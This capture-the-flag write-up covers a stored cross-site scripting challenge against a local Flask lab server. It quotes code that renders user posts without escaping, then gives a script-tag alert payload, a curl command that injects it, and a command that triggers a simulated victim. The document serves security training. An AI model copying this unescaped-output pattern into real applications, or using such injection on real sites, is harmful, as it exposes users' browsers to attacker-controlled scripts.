# Stored XSS Challenge ‚Äì `alert("PWNED")`

## üß† Challenge Overview

In this challenge, we build on the same stored XSS vulnerability from the previous level. This time, instead of injecting simple HTML (like `<input>` elements), we're required to inject and **execute JavaScript** code in the victim's browser. The goal is to make the victim's browser show a pop-up with the message:

```javascript
alert("PWNED")
````

## üîç Vulnerability Analysis

We are provided with a vulnerable Flask-based web server that allows users to post content, which is stored in a SQLite database and then rendered directly into the HTML response. Here's the key vulnerable part of the code:

```python
for post in db.execute("SELECT content FROM posts").fetchall(): 
    page += "<hr>" + post["content"] + "\n"
```

User input is inserted directly into the page without sanitization or escaping, making it a classic case of **Stored XSS**.

## üéØ Exploitation Strategy

1. Submit a POST request to `/` with a payload containing a `<script>` tag:

   ```html
   <script>alert("PWNED")</script>
   ```

2. The server stores this input as a new post.

3. When the victim visits the main page, the post will be rendered into the HTML page and the script will execute.

4. The victim is simulated using the `/challenge/victim` program, which triggers the flag logic if `alert("PWNED")` is executed.

## üöÄ Exploit Steps

### 1. Inject the XSS Payload

Use `curl` or any browser to send the payload:

```bash
curl -X POST -d 'content=<script>alert("PWNED")</script>' http://challenge.localhost:80/
```

### 2. Simulate the Victim

Trigger the victim‚Äôs visit using:

```bash
/challenge/victim http://challenge.localhost:80/
```

If successful, the simulated victim will see the JavaScript alert and the challenge will reward you with the flag.

## üõ†Ô∏è Debugging Tips

* Use **Firefox** in the DOJO‚Äôs GUI desktop.
* Use **View Source** or **Inspect Element** to ensure your `<script>` is properly injected.
* Open the **Developer Console** (`Ctrl + Shift + K`) to see if your JavaScript runs or errors.

## ‚úÖ Conclusion

This challenge demonstrates a real-world **Stored XSS** scenario where unescaped user input leads to arbitrary JavaScript execution. The exploitation involved submitting a malicious script that gets stored on the server and rendered for future users (victims).
